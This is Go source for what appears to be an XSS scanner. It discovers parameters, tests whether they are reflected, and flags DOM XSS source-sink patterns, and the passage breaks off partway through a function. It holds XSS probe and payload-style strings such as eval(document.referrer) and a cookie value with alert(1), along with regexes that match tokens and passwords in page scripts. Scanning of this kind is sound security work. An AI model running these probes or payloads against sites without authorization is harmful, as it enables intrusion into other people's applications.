package scanner

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"xss-scanner/internal/headless"
	"xss-scanner/internal/parser"
)

// Scanner represents the main XSS scanner
type Scanner struct {
	config     *Config
	client     *http.Client
	headless   *headless.Browser
	parser     *parser.HTMLParser
	mu         sync.Mutex
	lastResponseBody string // Added to store response body for context detection
}

// NewScanner creates a new XSS scanner instance
func NewScanner(config *Config) *Scanner {
	transport := &http.Transport{
		TLSHandshakeTimeout: 30 * time.Second,
		DisableCompression:  true, // Disable automatic decompression - we handle it manually
	}
	
	client := &http.Client{
		Timeout:   10 * time.Second,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Don't follow redirects to external domains
			originalHost := via[0].URL.Host
			redirectHost := req.URL.Host
			
			// If redirect is to a different host, don't follow it
			if originalHost != redirectHost {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	scanner := &Scanner{
		config: config,
		client: client,
		parser: parser.NewHTMLParser(),
	}

	if config.Headless {
		scanner.headless = headless.NewBrowser()
		if scanner.headless == nil {
		} else {
		}
	}

	return scanner
}

// Scan performs a complete XSS scan on the given URL
func (s *Scanner) Scan(ctx context.Context) (*ScanResult, error) {
	startTime := time.Now()
	
	if !s.config.Quiet {
		log.Printf("Starting XSS scan for: %s", s.config.URL)
	}

	result := &ScanResult{
		URL:       s.config.URL,
		Timestamp: time.Now(),
		Success:   false,
	}
	// Propagate WAF metadata
	result.WAFDetected = s.config.WAFDetected
	result.WAFName = s.config.WAFName

	// Parse URL and extract parameters
	parsedURL, err := url.Parse(s.config.URL)
	if err != nil {
		result.Error = fmt.Sprintf("Invalid URL: %v", err)
		return result, err
	}

	// Discover parameters
	parameters := s.discoverParameters(parsedURL)
	result.ParametersFound = make([]string, 0, len(parameters))
	for _, param := range parameters {
		result.ParametersFound = append(result.ParametersFound, param.Name)
	}

	if !s.config.Quiet {
		log.Printf("Discovered %d parameters", len(parameters))
	}

	// DOM-XSS detection: Analyze JavaScript for source-sink patterns (runs independently of parameters)
	// No headless browser required - just analyze JavaScript patterns
	var domXSSVulnerability *Vulnerability
	
	if !s.config.Quiet {
		log.Printf("Analyzing page for DOM XSS source-sink patterns")
	}
	
	// Get the page content to analyze JavaScript
	resp, err := s.makeRequest(s.config.URL)
	if err == nil {
		body, _ := s.readResponseBody(resp)
		
		// Analyze JavaScript for DOM XSS patterns
		hasPattern, source, sinkType := s.analyzeDOMXSSPatterns(body)
		if hasPattern {
			sourceKey := "generic"
			if source == "document.cookie" {
				sourceKey = "cookie"
			} else if source == "document.referrer" {
				sourceKey = "referrer"
			} else if source == "window.name" {
				sourceKey = "windowname"
			} else if source == "localStorage" {
				sourceKey = "localstorage"
			} else if source == "sessionStorage" {
				sourceKey = "sessionstorage"
			} else if source == "postMessage" {
				sourceKey = "postmessage"
			} else if source == "event_triggered" {
				sourceKey = "eventtriggered"
			} else if source == "typing_event" {
				sourceKey = "typingevent"
			} else if source == "javascript_uri" {
				sourceKey = "javascripturi"
			} else if source == "location.hash" {
				sourceKey = "locationhash"
			}

			var workingPayloads []string
			if source == "document.cookie" {
				cookieNames := s.extractCookieNamesFromJS(body)
				workingPayloads = []string{fmt.Sprintf("document.cookie=badValue=alert(1);%s", strings.Join(cookieNames, ","))}
			} else if source == "document.referrer" {
				// Static analysis only; illustrate referrer flow for different sinks
				if sinkType == "eval" {
					workingPayloads = []string{"eval(document.referrer)"}
				} else if sinkType == "innerHTML" {
					workingPayloads = []string{"element.innerHTML = document.referrer"}
				} else if sinkType == "outerHTML" {
					workingPayloads = []string{"element.outerHTML = document.referrer"}
				} else if sinkType == "document.write" {
					workingPayloads = []string{"document.write(document.referrer)"}
				} else {
					workingPayloads = []string{"document.referrer -> " + sinkType}
				}
			} else if source == "window.name" {
				// Static analysis only; illustrate window.name flow for different sinks
				if sinkType == "eval" {
					workingPayloads = []string{"eval(window.name)"}
				} else if sinkType == "innerHTML" {
					workingPayloads = []string{"element.innerHTML = window.name"}
				} else if sinkType == "document.write" {
					workingPayloads = []string{"document.write(window.name)"}
				} else {
					workingPayloads = []string{"window.name -> " + sinkType}
				}
			} else if source == "localStorage" {
				// Static analysis only; illustrate localStorage flow for different sinks
				if sinkType == "eval" {
					workingPayloads = []string{"eval(localStorage['key'])"}
				} else if sinkType == "innerHTML" {
					workingPayloads = []string{"element.innerHTML = localStorage.getItem('key')"}
				} else if sinkType == "document.write" {
					workingPayloads = []string{"document.write(localStorage['key'])"}
				} else {
					workingPayloads = []string{"localStorage -> " + sinkType}
				}
			} else if source == "sessionStorage" {
				// Static analysis only; illustrate sessionStorage flow for different sinks
				if sinkType == "eval" {
					workingPayloads = []string{"eval(sessionStorage['key'])"}
				} else if sinkType == "innerHTML" {
					workingPayloads = []string{"element.innerHTML = sessionStorage.getItem('key')"}
				} else if sinkType == "document.write" {
					workingPayloads = []string{"document.write(sessionStorage['key'])"}
				} else {
					workingPayloads = []string{"sessionStorage -> " + sinkType}
				}
			} else if source == "postMessage" {
				// Static analysis only; illustrate postMessage flow for different sinks
				if sinkType == "eval" {
					workingPayloads = []string{"addEventListener('message', function(e) { eval(e.data); })"}
				} else if sinkType == "innerHTML" {
					workingPayloads = []string{"addEventListener('message', function(e) { element.innerHTML = e.data; })"}
				} else if sinkType == "document.write" {
					workingPayloads = []string{"addEventListener('message', function(e) { document.write(e.data); })"}
				} else if sinkType == "complex_message" {
					workingPayloads = []string{"postMessage(data, '*')"}
				} else {
					workingPayloads = []string{"postMessage -> " + sinkType}
				}
			} else if source == "event_triggered" {
				// Static analysis only; illustrate event-triggered flow for different sinks
				if sinkType == "eval" {
					workingPayloads = []string{"onclick=\"eval(userInput)\""}
				} else if sinkType == "innerHTML" {
					workingPayloads = []string{"onclick=\"element.innerHTML = userInput\""}
				} else if sinkType == "document.write" {
					workingPayloads = []string{"onclick=\"document.write(userInput)\""}
				} else {
					workingPayloads = []string{"event_triggered -> " + sinkType}
				}
			} else if source == "typing_event" {
				// Static analysis only; illustrate typing event-triggered flow for different sinks
				if sinkType == "eval" {
					workingPayloads = []string{"oninput=\"eval(this.value)\""}
				} else if sinkType == "innerHTML" {
					workingPayloads = []string{"oninput=\"element.innerHTML = this.value\""}
				} else if sinkType == "document.write" {
					workingPayloads = []string{"oninput=\"document.write(this.value)\""}
				} else {
					workingPayloads = []string{"typing_event -> " + sinkType}
				}
			} else if source == "javascript_uri" {
				// Static analysis only; illustrate javascript: URI flow for location.href
				if sinkType == "location.href" {
					workingPayloads = []string{"location.href = \"javascript:document.write(userInput)\""}
				} else {
					workingPayloads = []string{"javascript_uri -> " + sinkType}
				}
			} else if source == "location.hash" {
				// Static analysis only; illustrate location.hash flow for different sinks
				if sinkType == "eval" {
					workingPayloads = []string{"eval(location.hash.substr(1))"}
				} else if sinkType == "innerHTML" {
					workingPayloads = []string{"element.innerHTML = location.hash.substr(1)"}
				} else if sinkType == "outerHTML" {
					workingPayloads = []string{"element.outerHTML = location.hash.substr(1)"}
				} else if sinkType == "document.write" {
					workingPayloads = []string{"document.write(location.hash.substr(1))"}
				} else {
					workingPayloads = []string{"location.hash -> " + sinkType}
				}
			}

			if !s.config.Quiet {
				log.Printf("DOM XSS pattern detected in JavaScript")
				log.Printf("DOM XSS vulnerability detected: %s -> %s sink pattern (requires manual verification)", source, sinkType)
			}
			
			// Create DOM XSS vulnerability
			domXSSVulnerability = &Vulnerability{
				Parameter: fmt.Sprintf("(%s)", source),
				Context:   fmt.Sprintf("dom_%s_%s (Source: %s, Sink: %s)", sourceKey, sinkType, source, sinkType),
				WorkingPayloads: workingPayloads,
				ExploitURL: s.config.URL,
				Method: "GET",
				IsDirectlyExploitable: false,
				ManualInterventionRequired: true,
				Confidence: "medium",
			}
			
		}
	}
	
	if !s.config.Quiet {
		log.Printf("DOM XSS analysis completed")
	}

	// If WAF detected, do ONLY lightweight reflection probe - no full payload testing
	if s.config.WAFDetected {
		probe := `"><surajishere`
		var wafVulnerabilities []Vulnerability
		seenURLs := make(map[string]bool) // Deduplicate by exploit URL
		
		if len(parameters) > 0 {
			for _, p := range parameters {
				testURL := *parsedURL
				q := testURL.Query()
				q.Set(p.Name, probe)
				testURL.RawQuery = q.Encode()
				resp, err := s.makeRequest(testURL.String())
				if err == nil {
					body, _ := s.readResponseBody(resp)
					if strings.Contains(body, probe) {
						// Check if we've already seen this exploit URL
						exploitURL := testURL.String()
						if !seenURLs[exploitURL] {
							seenURLs[exploitURL] = true
							v := Vulnerability{
								Parameter: p.Name,
								Context:   "raw_reflection",
								WorkingPayloads: []string{probe},
								ExploitURL: exploitURL,
								Method: "GET",
								IsDirectlyExploitable: false,
								ManualInterventionRequired: true,
								Confidence: "low",
							}
							wafVulnerabilities = append(wafVulnerabilities, v)
						}
					}
				}
			}
		}
		
		// Use deduplicated vulnerabilities
		result.Vulnerabilities = wafVulnerabilities
		result.VulnerabilitiesFound = len(wafVulnerabilities)
		// WAF mode: Always return after probe, regardless of findings
		result.ParametersTested = len(parameters)
		result.Success = true
		result.ScanDuration = time.Since(startTime)
		
		// Include DOM XSS vulnerability if found
		if domXSSVulnerability != nil {
			result.Vulnerabilities = append(result.Vulnerabilities, *domXSSVulnerability)
			result.VulnerabilitiesFound++
		}
		
		return result, nil
	}

	// Test each parameter for XSS
	var vulnerabilities []Vulnerability
	var reflectingParams []string
	var skippedParams []string

	for _, param := range parameters {
		select {
		case <-ctx.Done():
			result.Error = "Scan cancelled"
			return result, ctx.Err()
		default:
		}

		if !s.config.Quiet {
			log.Printf("Testing parameter: %s", param.Name)
		}

		// Test parameter reflection
		reflects, context, err := s.testParameterReflection(parsedURL, param)
		if err != nil {
			if !s.config.Quiet {
				log.Printf("Error testing parameter %s: %v", param.Name, err)
			}
			skippedParams = append(skippedParams, param.Name)
			continue
		}

		// DOM-based reflection disabled
		if false && !reflects && param.Type == "fragment" {
			domReflects, domContext, domErr := s.testDOMBasedReflection(parsedURL, param)
			if domErr == nil && domReflects {
				reflects = true
				context = domContext
				if !s.config.Quiet {
					log.Printf("Parameter %s reflects in DOM manipulation", param.Name)
				}
			}
		}

		if !reflects {
			if !s.config.Quiet {
				log.Printf("Parameter %s does not reflect in response or DOM", param.Name)
			}
			skippedParams = append(skippedParams, param.Name)
			continue
		}

		reflectingParams = append(reflectingParams, param.Name)


		// Test XSS payloads only if parameter reflects
		vuln, err := s.testXSSPayloads(ctx, parsedURL, param, HTMLContext(context))
		if err != nil {
			if !s.config.Quiet {
				log.Printf("Error testing XSS payloads for %s: %v", param.Name, err)
			}
			continue
		}

		if vuln != nil {
			vulnerabilities = append(vulnerabilities, *vuln)
		}
	}

	result.ParametersTested = len(parameters)
	
	// Include DOM XSS vulnerability if found
	if domXSSVulnerability != nil {
		vulnerabilities = append(vulnerabilities, *domXSSVulnerability)
	}
	
	result.VulnerabilitiesFound = len(vulnerabilities)
	result.Vulnerabilities = vulnerabilities
	result.ReflectingParams = reflectingParams
	result.SkippedParams = skippedParams
	result.Success = true
	result.ScanDuration = time.Since(startTime)

	if !s.config.Quiet {
		log.Printf("Scan completed in %v. Found %d vulnerabilities", result.ScanDuration, len(vulnerabilities))
	}

	return result, nil
}

// discoverParameters finds all parameters in the URL, hidden parameters, form parameters, and JavaScript parameters
func (s *Scanner) discoverParameters(parsedURL *url.URL) []Parameter {
	var parameters []Parameter

	// Extract query parameters
	queryParams := parsedURL.Query()
	for name := range queryParams {
		parameters = append(parameters, Parameter{
			Name: name,
			Type: "query",
		})
	}

	// Use ParamsMap for enhanced parameter discovery if enabled
	if s.config.UseParamsMap {
		paramsMapParams := s.discoverParametersWithParamsMap(parsedURL)
		parameters = append(parameters, paramsMapParams...)
	}

	// Discover form parameters from HTML content
	formParams := s.discoverFormParameters(parsedURL)
	parameters = append(parameters, formParams...)


	// Discover JavaScript parameters (DISABLED - too many false positives)
	// jsParams := s.discoverJavaScriptParameters(parsedURL)
	// parameters = append(parameters, jsParams...)

	// Also check for fragment-based parameters (DOM XSS)
	if parsedURL.Fragment != "" {
		parameters = append(parameters, Parameter{
			Name: "fragment",
			Type: "fragment",
		})
	}

	if !s.config.Quiet {
		paramsMapCount := 0
		if s.config.UseParamsMap {
			paramsMapCount = len(parameters) - len(queryParams) - len(formParams)
		}
		log.Printf("Total parameters discovered: %d (query: %d, form: %d, paramsmap: %d)", 
			len(parameters), len(queryParams), len(formParams), paramsMapCount)
	}

	return parameters
}

// discoverFormParameters finds form parameters from HTML content
func (s *Scanner) discoverFormParameters(parsedURL *url.URL) []Parameter {
	var parameters []Parameter
	
	// Get the page content to analyze forms
	content, err := s.getPageContent(parsedURL.String())
	if err != nil {
		if !s.config.Quiet {
			log.Printf("Error getting page content for form analysis: %v", err)
		}
		return parameters
	}
	
	// Parse HTML to find form inputs
	formParams := s.parseFormInputs(content)
	for _, paramName := range formParams {
		parameters = append(parameters, Parameter{
			Name: paramName,
			Type: "form",
		})
	}
	
	if !s.config.Quiet && len(formParams) > 0 {
		log.Printf("Discovered %d form parameters: %v", len(formParams), formParams)
	}
	
	return parameters
}

// parseFormInputs extracts input field names from HTML forms
func (s *Scanner) parseFormInputs(html string) []string {
	var formParams []string
	
	// Simple regex to find input fields with name attributes
	inputRegex := regexp.MustCompile(`<input[^>]*name\s*=\s*["']([^"']+)["'][^>]*>`)
	matches := inputRegex.FindAllStringSubmatch(html, -1)
	
	for _, match := range matches {
		if len(match) > 1 {
			paramName := match[1]
			// Avoid duplicates
			found := false
			for _, existing := range formParams {
				if existing == paramName {
					found = true
					break
				}
			}
			if !found {
				formParams = append(formParams, paramName)
			}
		}
	}
	
	return formParams
}

// ParamsMapResult represents the JSON output from ParamsMap
type ParamsMapResult struct {
	Params        []string `json:"params"`
	FormParams    []string `json:"form_params"`
	TotalRequests int      `json:"total_requests"`
	Aborted       bool     `json:"aborted"`
	AbortReason   string   `json:"abort_reason"`
}

// discoverParametersWithParamsMap uses ParamsMap tool for enhanced parameter discovery
func (s *Scanner) discoverParametersWithParamsMap(parsedURL *url.URL) []Parameter {
	var parameters []Parameter

	if !s.config.Quiet {
		log.Printf("Running ParamsMap parameter discovery for: %s", parsedURL.String())
	}

	if !s.isParamsMapAvailable() {
		if !s.config.Quiet {
			log.Printf("ParamsMap not available, skipping enhanced parameter discovery")
		}
		return parameters
	}

	// Check if wordlist file exists
	if _, err := os.Stat(s.config.WordlistFile); os.IsNotExist(err) {
		if !s.config.Quiet {
			log.Printf("Wordlist file not found: %s", s.config.WordlistFile)
		}
		return parameters
	}

	// Create temporary file for ParamsMap output
	tmpFile, err := os.CreateTemp("", "paramsmap_output_*.json")
	if err != nil {
		if !s.config.Quiet {
			log.Printf("Error creating temp file for ParamsMap: %v", err)
		}
		return parameters
	}
	defer os.Remove(tmpFile.Name())
	tmpFile.Close()

	// Build ParamsMap command
	cmd := exec.Command("paramsmap",
		"-url", parsedURL.String(),
		"-wordlist", s.config.WordlistFile,
		"-report", tmpFile.Name(),
		"-chunk-size", "100", // Smaller chunks for faster processing
	)

	// Add headers if available
	if len(s.config.Headers) > 0 {
		for key, value := range s.config.Headers {
			cmd.Args = append(cmd.Args, "-H", fmt.Sprintf("%s: %s", key, value))
		}
	}

	// Run ParamsMap with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	cmd = exec.CommandContext(ctx, cmd.Path, cmd.Args[1:]...)

	if !s.config.Quiet {
		log.Printf("Running ParamsMap command: %s", cmd.String())
		log.Printf("Output file: %s", tmpFile.Name())
	}

	output, err := cmd.Output()
	if err != nil {
		if !s.config.Quiet {
			log.Printf("ParamsMap execution failed: %v, output: %s", err, string(output))
		}
		return parameters
	}

	if !s.config.Quiet {
		log.Printf("ParamsMap execution successful")
	}

	// Check if output file exists and has content
	if _, err := os.Stat(tmpFile.Name()); os.IsNotExist(err) {
		if !s.config.Quiet {
			log.Printf("ParamsMap output file not created: %s", tmpFile.Name())
		}
		return parameters
	}

	// Parse ParamsMap output
	paramsMapParams, err := s.parseParamsMapOutput(tmpFile.Name())
	if err != nil {
		if !s.config.Quiet {
			log.Printf("Error parsing ParamsMap output: %v", err)
		}
		return parameters
	}

	// Convert ParamsMap parameters to our Parameter format
	for _, paramName := range paramsMapParams {
		parameters = append(parameters, Parameter{
			Name: paramName,
			Type: "paramsmap",
		})
	}

	if !s.config.Quiet && len(parameters) > 0 {
		log.Printf("ParamsMap discovered %d additional parameters: %v", len(parameters), 
			s.getParameterNames(parameters))
	}

	return parameters
}

// isParamsMapAvailable checks if ParamsMap is installed and available
func (s *Scanner) isParamsMapAvailable() bool {
	cmd := exec.Command("paramsmap", "-h")
	err := cmd.Run()
	return err == nil
}

// parseParamsMapOutput parses ParamsMap JSON output file
func (s *Scanner) parseParamsMapOutput(filename string) ([]string, error) {
	var parameters []string

	// Read the JSON file
	data, err := os.ReadFile(filename)
	if err != nil {
		return parameters, err
	}

	// Parse JSON
	var result ParamsMapResult
	if err := json.Unmarshal(data, &result); err != nil {
		return parameters, err
	}

	// Return discovered parameters
	return result.Params, nil
}


// discoverJavaScriptParameters finds parameters from JavaScript files and dynamic content
func (s *Scanner) discoverJavaScriptParameters(parsedURL *url.URL) []Parameter {
	var parameters []Parameter
	
	// Get the page content to analyze JavaScript
	content, err := s.getPageContent(parsedURL.String())
	if err != nil {
		if !s.config.Quiet {
			log.Printf("Error getting page content for JS analysis: %v", err)
		}
		return parameters
	}
	
	// 1. Discover JavaScript files referenced in HTML
	jsFiles := s.extractJavaScriptFiles(content, parsedURL)
	
	// 2. Analyze inline JavaScript in HTML
	inlineParams := s.analyzeInlineJavaScript(content)
	parameters = append(parameters, inlineParams...)
	
	// 3. Fetch and analyze external JavaScript files
	for _, jsFile := range jsFiles {
		jsParams := s.analyzeJavaScriptFile(jsFile)
		parameters = append(parameters, jsParams...)
	}
	
	// 4. Discover AJAX endpoints and their parameters
	ajaxParams := s.discoverAjaxEndpoints(content)
	parameters = append(parameters, ajaxParams...)
	
	// 5. Discover client-side routing parameters
	routingParams := s.discoverClientRouting(content)
	parameters = append(parameters, routingParams...)
	
	// 6. Test discovered endpoints for XSS vulnerabilities
	endpoints := s.extractEndpoints(content, parsedURL)
	for _, endpoint := range endpoints {
		s.testEndpointForXSS(endpoint)
	}
	
	if !s.config.Quiet && len(parameters) > 0 {
		log.Printf("Discovered %d JavaScript parameters: %v", len(parameters), 
			s.getParameterNames(parameters))
	}
	
	return parameters
}

// extractJavaScriptFiles finds JavaScript files referenced in HTML
func (s *Scanner) extractJavaScriptFiles(html string, baseURL *url.URL) []string {
	var jsFiles []string
	
	// Find script src attributes
	scriptRegex := regexp.MustCompile(`<script[^>]*src\s*=\s*["']([^"']+)["'][^>]*>`)
	matches := scriptRegex.FindAllStringSubmatch(html, -1)
	
	for _, match := range matches {
		if len(match) > 1 {
			jsFile := match[1]
			// Convert relative URLs to absolute
			if strings.HasPrefix(jsFile, "//") {
				jsFile = baseURL.Scheme + ":" + jsFile
			} else if strings.HasPrefix(jsFile, "/") {
				jsFile = baseURL.Scheme + "://" + baseURL.Host + jsFile
			} else if !strings.HasPrefix(jsFile, "http") {
				jsFile = baseURL.Scheme + "://" + baseURL.Host + "/" + jsFile
			}
			jsFiles = append(jsFiles, jsFile)
		}
	}
	
	return jsFiles
}

// analyzeInlineJavaScript analyzes JavaScript code embedded in HTML
func (s *Scanner) analyzeInlineJavaScript(html string) []Parameter {
	var parameters []Parameter
	
	// Extract inline JavaScript from script tags
	scriptRegex := regexp.MustCompile(`<script[^>]*>(.*?)</script>`)
	matches := scriptRegex.FindAllStringSubmatch(html, -1)
	
	for _, match := range matches {
		if len(match) > 1 {
			jsCode := match[1]
			params := s.extractParametersFromJavaScript(jsCode)
			parameters = append(parameters, params...)
		}
	}
	
	return parameters
}

// analyzeJavaScriptFile fetches and analyzes an external JavaScript file
func (s *Scanner) analyzeJavaScriptFile(jsURL string) []Parameter {
	var parameters []Parameter
	
	// Fetch JavaScript file content
	content, err := s.getPageContent(jsURL)
	if err != nil {
		if !s.config.Quiet {
			log.Printf("Error fetching JavaScript file %s: %v", jsURL, err)
		}
		return parameters
	}
	
	// Extract parameters from JavaScript code
	parameters = s.extractParametersFromJavaScript(content)
	
	return parameters
}

// extractParametersFromJavaScript extracts parameter names from JavaScript code
func (s *Scanner) extractParametersFromJavaScript(jsCode string) []Parameter {
	var parameters []Parameter
	
	// Very specific and conservative parameter patterns
	patterns := []struct {
		regex *regexp.Regexp
		paramType string
	}{
		// Route parameters: /:param (very specific)
		{regexp.MustCompile(`path\s*:\s*['"][^'"]*:([a-zA-Z_][a-zA-Z0-9_]+)['"]`), "route"},
		{regexp.MustCompile(`/:([a-zA-Z_][a-zA-Z0-9_]+)`), "route"},
		
		// Function parameters in function declarations (very specific)
		{regexp.MustCompile(`function\s+[a-zA-Z_][a-zA-Z0-9_]*\s*\(\s*([a-zA-Z_][a-zA-Z0-9_]+)\s*[,)]`), "function"},
		
		// AJAX data parameters (very specific)
		{regexp.MustCompile(`data\s*:\s*\{[^}]*([a-zA-Z_][a-zA-Z0-9_]+)\s*:`), "ajax"},
		{regexp.MustCompile(`\.ajax\s*\(\s*\{[^}]*data\s*:\s*\{[^}]*([a-zA-Z_][a-zA-Z0-9_]+)\s*:`), "ajax"},
		
		// FormData.append parameters (very specific)
		{regexp.MustCompile(`FormData\(\)\.append\s*\(\s*['"]([^'"]+)['"]`), "formdata"},
		{regexp.MustCompile(`\.append\s*\(\s*['"]([^'"]+)['"]`), "formdata"},
		
		// URLSearchParams parameters (very specific)
		{regexp.MustCompile(`URLSearchParams\s*\(\s*\{[^}]*([a-zA-Z_][a-zA-Z0-9_]+)\s*:`), "urlsearchparams"},
		
		// Specific common parameter names (very specific)
		{regexp.MustCompile(`userId\s*[:=]\s*['"]?([^'",\s]+)`), "user"},
		{regexp.MustCompile(`productId\s*[:=]\s*['"]?([^'",\s]+)`), "product"},
		{regexp.MustCompile(`sessionId\s*[:=]\s*['"]?([^'",\s]+)`), "session"},
		{regexp.MustCompile(`apiKey\s*[:=]\s*['"]?([^'",\s]+)`), "api"},
		{regexp.MustCompile(`token\s*[:=]\s*['"]?([^'",\s]+)`), "token"},
		{regexp.MustCompile(`username\s*[:=]\s*['"]?([^'",\s]+)`), "username"},
		{regexp.MustCompile(`password\s*[:=]\s*['"]?([^'",\s]+)`), "password"},
		{regexp.MustCompile(`email\s*[:=]\s*['"]?([^'",\s]+)`), "email"},
		{regexp.MustCompile(`phone\s*[:=]\s*['"]?([^'",\s]+)`), "phone"},
		{regexp.MustCompile(`category\s*[:=]\s*['"]?([^'",\s]+)`), "category"},
		{regexp.MustCompile(`search\s*[:=]\s*['"]?([^'",\s]+)`), "search"},
		{regexp.MustCompile(`query\s*[:=]\s*['"]?([^'",\s]+)`), "query"},
		{regexp.MustCompile(`limit\s*[:=]\s*['"]?([^'",\s]+)`), "limit"},
		{regexp.MustCompile(`offset\s*[:=]\s*['"]?([^'",\s]+)`), "offset"},
		{regexp.MustCompile(`page\s*[:=]\s*['"]?([^'",\s]+)`), "page"},
		{regexp.MustCompile(`sort\s*[:=]\s*['"]?([^'",\s]+)`), "sort"},
		{regexp.MustCompile(`filter\s*[:=]\s*['"]?([^'",\s]+)`), "filter"},
	}
	
	paramMap := make(map[string]bool)
	
	for _, pattern := range patterns {
		matches := pattern.regex.FindAllStringSubmatch(jsCode, -1)
		for _, match := range matches {
			if len(match) > 1 {
				paramName := match[1]
				
				// Only accept parameters that are at least 3 characters and look like real parameter names
				if len(paramName) < 3 {
					continue
				}
				
				// Filter out common false positives
				if strings.HasPrefix(paramName, "get") || strings.HasPrefix(paramName, "set") ||
				   strings.HasPrefix(paramName, "is") || strings.HasPrefix(paramName, "has") ||
				   strings.HasPrefix(paramName, "on") || strings.HasPrefix(paramName, "off") ||
				   strings.HasPrefix(paramName, "add") || strings.HasPrefix(paramName, "remove") ||
				   strings.HasPrefix(paramName, "create") || strings.HasPrefix(paramName, "delete") ||
				   strings.HasPrefix(paramName, "update") || strings.HasPrefix(paramName, "find") {
					continue
				}
				
				// Filter out common HTML/CSS/JS fragments
				if paramName == "html" || paramName == "css" || paramName == "js" ||
				   paramName == "dom" || paramName == "api" || paramName == "url" ||
				   paramName == "src" || paramName == "href" || paramName == "alt" ||
				   paramName == "title" || paramName == "name" || paramName == "type" ||
				   paramName == "value" || paramName == "class" || paramName == "style" ||
				   paramName == "width" || paramName == "height" || paramName == "top" ||
				   paramName == "left" || paramName == "right" || paramName == "bottom" {
					continue
				}
				
				if !paramMap[paramName] {
					paramMap[paramName] = true
					parameters = append(parameters, Parameter{
						Name: paramName,
						Type: "js_" + pattern.paramType,
					})
				}
			}
		}
	}
	
	return parameters
}

// discoverAjaxEndpoints finds AJAX endpoints and their parameters
func (s *Scanner) discoverAjaxEndpoints(html string) []Parameter {
	var parameters []Parameter
	
	// AJAX patterns
	ajaxPatterns := []*regexp.Regexp{
		// jQuery AJAX
		regexp.MustCompile(`\$\.ajax\s*\(\s*\{[^}]*url\s*:\s*['"]([^'"]+)['"]`),
		regexp.MustCompile(`\$\.get\s*\(\s*['"]([^'"]+)['"]`),
		regexp.MustCompile(`\$\.post\s*\(\s*['"]([^'"]+)['"]`),
		// Fetch API
		regexp.MustCompile(`fetch\s*\(\s*['"]([^'"]+)['"]`),
		// XMLHttpRequest
		regexp.MustCompile(`\.open\s*\(\s*['"][^'"]*['"]\s*,\s*['"]([^'"]+)['"]`),
		// Axios
		regexp.MustCompile(`axios\.(get|post|put|delete)\s*\(\s*['"]([^'"]+)['"]`),
	}
	
	endpointMap := make(map[string]bool)
	
	for _, pattern := range ajaxPatterns {
		matches := pattern.FindAllStringSubmatch(html, -1)
		for _, match := range matches {
			if len(match) > 1 {
				endpoint := match[1]
				if !endpointMap[endpoint] {
					endpointMap[endpoint] = true
					// Extract parameters from endpoint URL
					if strings.Contains(endpoint, "?") {
						queryPart := strings.Split(endpoint, "?")[1]
						params := strings.Split(queryPart, "&")
						for _, param := range params {
							if strings.Contains(param, "=") {
								paramName := strings.Split(param, "=")[0]
								parameters = append(parameters, Parameter{
									Name: paramName,
									Type: "ajax",
								})
							}
						}
					}
				}
			}
		}
	}
	
	return parameters
}

// discoverClientRouting finds client-side routing parameters
func (s *Scanner) discoverClientRouting(html string) []Parameter {
	var parameters []Parameter
	
	// Client-side routing patterns
	routingPatterns := []*regexp.Regexp{
		// React Router: /:param
		regexp.MustCompile(`path\s*:\s*['"][^'"]*:([a-zA-Z_][a-zA-Z0-9_]*)`),
		// Vue Router: /:param
		regexp.MustCompile(`path\s*:\s*['"][^'"]*:([a-zA-Z_][a-zA-Z0-9_]*)`),
		// Angular Router: /:param
		regexp.MustCompile(`path\s*:\s*['"][^'"]*:([a-zA-Z_][a-zA-Z0-9_]*)`),
		// Express.js routes: /:param
		regexp.MustCompile(`app\.(get|post|put|delete)\s*\(\s*['"][^'"]*:([a-zA-Z_][a-zA-Z0-9_]*)`),
		// Next.js dynamic routes: [param]
		regexp.MustCompile(`\[([a-zA-Z_][a-zA-Z0-9_]*)\]`),
		// Svelte routes: [param]
		regexp.MustCompile(`\[([a-zA-Z_][a-zA-Z0-9_]*)\]`),
	}
	
	paramMap := make(map[string]bool)
	
	for _, pattern := range routingPatterns {
		matches := pattern.FindAllStringSubmatch(html, -1)
		for _, match := range matches {
			if len(match) > 1 {
				paramName := match[1]
				if !paramMap[paramName] {
					paramMap[paramName] = true
					parameters = append(parameters, Parameter{
						Name: paramName,
						Type: "route",
					})
				}
			}
		}
	}
	
	return parameters
}

// getParameterNames returns a slice of parameter names for logging
func (s *Scanner) getParameterNames(parameters []Parameter) []string {
	var names []string
	for _, param := range parameters {
		names = append(names, param.Name)
	}
	return names
}

// extractEndpoints extracts API endpoints from JavaScript code
func (s *Scanner) extractEndpoints(html string, baseURL *url.URL) []string {
	var endpoints []string
	
	// Extract endpoints from AJAX patterns
	endpointPatterns := []*regexp.Regexp{
		// jQuery AJAX
		regexp.MustCompile(`\$\.ajax\s*\(\s*\{[^}]*url\s*:\s*['"]([^'"]+)['"]`),
		regexp.MustCompile(`\$\.get\s*\(\s*['"]([^'"]+)['"]`),
		regexp.MustCompile(`\$\.post\s*\(\s*['"]([^'"]+)['"]`),
		// Fetch API
		regexp.MustCompile(`fetch\s*\(\s*['"]([^'"]+)['"]`),
		// XMLHttpRequest
		regexp.MustCompile(`\.open\s*\(\s*['"][^'"]*['"]\s*,\s*['"]([^'"]+)['"]`),
		// Axios
		regexp.MustCompile(`axios\.(get|post|put|delete)\s*\(\s*['"]([^'"]+)['"]`),
		// Form action attributes
		regexp.MustCompile(`action\s*=\s*['"]([^'"]+)['"]`),
	}
	
	endpointMap := make(map[string]bool)
	
	for _, pattern := range endpointPatterns {
		matches := pattern.FindAllStringSubmatch(html, -1)
		for _, match := range matches {
			if len(match) > 1 {
				endpoint := match[1]
				// Convert relative URLs to absolute
				if strings.HasPrefix(endpoint, "//") {
					endpoint = baseURL.Scheme + ":" + endpoint
				} else if strings.HasPrefix(endpoint, "/") {
					endpoint = baseURL.Scheme + "://" + baseURL.Host + endpoint
				} else if !strings.HasPrefix(endpoint, "http") {
					endpoint = baseURL.Scheme + "://" + baseURL.Host + "/" + endpoint
				}
				
				if !endpointMap[endpoint] {
					endpointMap[endpoint] = true
					endpoints = append(endpoints, endpoint)
				}
			}
		}
	}
	
	return endpoints
}

// testEndpointForXSS tests an endpoint for XSS vulnerabilities
func (s *Scanner) testEndpointForXSS(endpoint string) {
	if !s.config.Quiet {
		log.Printf("Testing endpoint for XSS: %s", endpoint)
